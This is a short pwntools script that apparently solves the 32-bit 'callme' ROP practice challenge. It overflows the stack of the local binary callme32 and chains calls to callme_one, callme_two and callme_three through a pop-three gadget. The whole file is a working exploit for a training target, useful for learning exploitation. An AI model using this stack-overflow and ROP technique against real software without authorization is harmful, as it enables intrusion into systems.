from pwn import *

context(arch='i386', os='linux', log_level='DEBUG')
f = './callme32'
p = process(f)
elf = ELF(f)

pop3 = 0x80488a9

p.recvuntil('>')
payload = flat('a'*0x2c,elf.plt['callme_one'],pop3,1,2,3,elf.plt['callme_two'],pop3,1,2,3,elf.plt['callme_three'],pop3,1,2,3)
p.sendline(payload)

p.interactive()